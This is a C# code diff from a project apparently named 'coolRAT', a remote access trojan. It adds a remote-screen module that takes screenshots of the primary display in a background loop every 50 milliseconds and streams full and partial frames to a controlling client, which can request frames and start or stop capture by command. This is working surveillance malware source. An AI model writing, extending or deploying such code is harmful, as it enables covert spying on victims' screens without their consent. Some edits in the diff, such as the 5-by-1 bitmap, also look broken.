@@ -12,7 +12,7 @@ using System.Windows.Forms;
 
 namespace coolRAT.Libs
 {
-    public static class ImageCompressor
+    public static class ImageUtils
     {
         public static Image ResizeImage(Image source, Size size)
         {
@@ -26,16 +26,17 @@ namespace coolRAT.Libs
 
         public static Image TakeScreenshot(Screen Screen)
         {
+            
             using (MemoryStream m = new MemoryStream())
             {
-                Bitmap img = new Bitmap(Screen.Bounds.Width, Screen.Bounds.Height, PixelFormat.Format24bppRgb);
+                Bitmap img = new Bitmap(5, 1, PixelFormat.Format24bppRgb);
                 Graphics g = Graphics.FromImage(img);
                 g.CopyFromScreen(
                     Screen.Bounds.X,
                     Screen.Bounds.Y,
                     0,
                     0,
-                    img.Size); //yeet done.
+                    Screen.Bounds.Size); //yeet done.
 
                 img.Save(m, ImageFormat.Png);
                 img.Dispose();
@@ -44,11 +45,13 @@ namespace coolRAT.Libs
             }
         }
 
+
+
         public static byte[] ToByteArray(Image source)
         {
             using (var stream = new MemoryStream())
             {
-                source.Save(stream, ImageFormat.Jpeg);
+                source.Save(stream, ImageFormat.Png);
                 return stream.ToArray();
             }
         }
@@ -217,33 +220,114 @@ namespace coolRAT.Libs
         public Client OwnerClient;
         public Thread FrameSenderThread;
         public Bitmap LastFrame;
+        public Guid UniqueId;
 
         public RemoteScreen(Client ownerClient)
         {
+            UniqueId = Guid.NewGuid();
             OwnerClient = ownerClient ?? throw new ArgumentNullException(nameof(ownerClient));
             LastFrame = null;
-            OwnerClient.RegisterPacketHandler("RequestFramePacketTemporary", CommandReceiver_EventHandler);
+            OwnerClient.RegisterPacketHandler("ScreenCommandPacket", CommandReceiver_EventHandler);
+        }
+
+        public void SenderLoop()
+        {
+            while(true)
+            {
+                if(LastFrame == null)
+                {
+                    // Send a full frame
+                    LastFrame = GetFullScreenshot();
+                    ScreenFramePacket frame = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Full, LastFrame);
+                    OwnerClient.SendPacket(frame);
+                }
+                else
+                {
+                    // Send a partial frame
+                    Bitmap diff = GetPartialScreenshot();
+                    ScreenFramePacket frame = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Partial, diff);
+                    OwnerClient.SendPacket(frame);
+                    LastFrame = diff;
+                }
+
+                Thread.Sleep(50);
+            }
+        }
+
+        public void Start()
+        {
+            if (FrameSenderThread != null) Stop();
+            FrameSenderThread = new Thread(new ThreadStart(SenderLoop));
+            FrameSenderThread.IsBackground = true;
+            FrameSenderThread.Start();
+        }
+
+        public void Stop()
+        {
+            if (FrameSenderThread != null) if (FrameSenderThread.IsAlive) FrameSenderThread.Abort();
+            FrameSenderThread = null;
+        }
+
+        public void Destroy()
+        {
+            OwnerClient.DeregisterPacketHandler("ScreenCommandPacket");
+            Stop();
         }
 
         public void CommandReceiver_EventHandler(object sender, PacketReceivedEventArgs e)
         {
-            if (e.Packet.Type == "RequestFramePacketTemporary")
+            if(e.Packet.Type == "ScreenCommandPacket")
             {
-                ScreenFrame screenFrame;
-                if (LastFrame == null)
+                ScreenCommandPacket screenCommandPacket = ScreenCommandPacket.Deserialize(e.RawPacket);
+                if (screenCommandPacket.UniqueScreenId != UniqueId) return;
+                switch(screenCommandPacket.CommandType)
                 {
-                    LastFrame = (Bitmap)ImageCompressor.TakeScreenshot(Screen.PrimaryScreen);
-                    screenFrame = new ScreenFrame(OwnerClient.UniqueId, LastFrame);
-                    OwnerClient.SendPacket(screenFrame);
-                    return;
-                }
+                    case CommandType.RequestFrame:
+                        if(screenCommandPacket.Arguments == "Full")
+                        {
+                            LastFrame = GetFullScreenshot();
+                            ScreenFramePacket screenFramePacket = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Full, LastFrame);
+                            OwnerClient.SendPacket(screenFramePacket);
+                            return;
+                        }
 
-                Bitmap bitmap_new = (Bitmap)ImageCompressor.TakeScreenshot(Screen.PrimaryScreen);
-                Bitmap diff = ImageCompressor.Vector2Diff(LastFrame, bitmap_new);
-                diff = LastFrame;
-                screenFrame = new ScreenFrame(OwnerClient.UniqueId, diff);
-                OwnerClient.SendPacket(screenFrame);
+                        if(screenCommandPacket.Arguments == "Partial")
+                        {
+                            ScreenFramePacket screenFramePacket;
+                            if(LastFrame == null)
+                            {
+                                LastFrame = GetFullScreenshot();
+                                screenFramePacket = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Full, LastFrame);
+                                OwnerClient.SendPacket(screenFramePacket);
+                                return;
+                            }
+
+                            Bitmap diff = GetPartialScreenshot();
+                            screenFramePacket = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Partial, diff);
+                            OwnerClient.SendPacket(screenFramePacket);
+                            LastFrame = diff;
+                            return;
+                        }
+                        break;
+                    case CommandType.SetState:
+                        if (screenCommandPacket.Arguments == "Running")
+                            Start();
+                        else if (screenCommandPacket.Arguments == "Stopped")
+                            Stop();
+                        break;
+                }
             }
+        }
+
+        public Bitmap GetFullScreenshot()
+        {
+            return (Bitmap)ImageUtils.ResizeImage(ImageUtils.TakeScreenshot(Screen.PrimaryScreen), new Size(1024, 768));
+        }
+
+        public Bitmap GetPartialScreenshot()
+        {
+            if (LastFrame == null) return null;
+            return ImageUtils.Vector2Diff(LastFrame, GetFullScreenshot());
         }
     }
 }
